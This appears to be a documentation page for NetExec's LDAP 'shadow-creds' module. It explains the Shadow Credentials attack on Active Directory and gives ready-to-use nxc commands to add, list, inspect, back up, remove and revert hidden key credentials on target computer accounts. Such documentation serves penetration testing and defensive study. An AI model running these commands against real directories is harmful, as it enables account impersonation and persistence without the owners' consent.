---
description: Shadow Credentials Attack
---

# 🆕 Shadow Credentials Attack

The LDAP shadow-creds module enables the Shadow Credentials attack, an exploitation technique inspired by [pyWhisker](https://github.com/ShutdownRepo/pywhisker). This attack allows an attacker to add a hidden authentication credential to a target account and impersonate it without modifying its existing password.

Relevated actions are below:

```
list
add
remove
backup
revert
keyCredentials of computers.
```


Add/list/remove usage

```bash
nxc ldap <ip> -u user -p pass -M shadow-creds -o TARGET=targetcomputer$ ACTION=add
nxc ldap <ip> -u user -p pass -M shadow-creds -o TARGET=targetcomputer$ ACTION=list
nxc ldap <ip> -u user -p pass -M shadow-creds -o TARGET=targetcomputer$ ACTION=remove
```

Cred info usage

```bash
nxc ldap <ip> -u user -p pass -M shadow-creds -o TARGET=targetcomputer$ ACTION=list
nxc ldap <ip> -u user -p pass -M shadow-creds -o TARGET=targetcomputer$ ACTION=info DEVICE_ID=<guid>
```

Backup and Revert

```bash
nxc ldap <ip> -u user -p pass -M shadow-creds -o TARGET=targetcomputer$ ACTION=list
nxc ldap <ip> -u user -p pass -M shadow-creds -o TARGET=targetcomputer$ ACTION=add
nxc ldap <ip> -u user -p pass -M shadow-creds -o TARGET=targetcomputer$ ACTION=backup
nxc ldap <ip> -u user -p pass -M shadow-creds -o TARGET=targetcomputer$ ACTION=remove DEVICE_ID=<guid>
nxc ldap <ip> -u user -p pass -M shadow-creds -o TARGET=targetcomputer$ ACTION=revert JSONFILE=shadow-creds.json
```

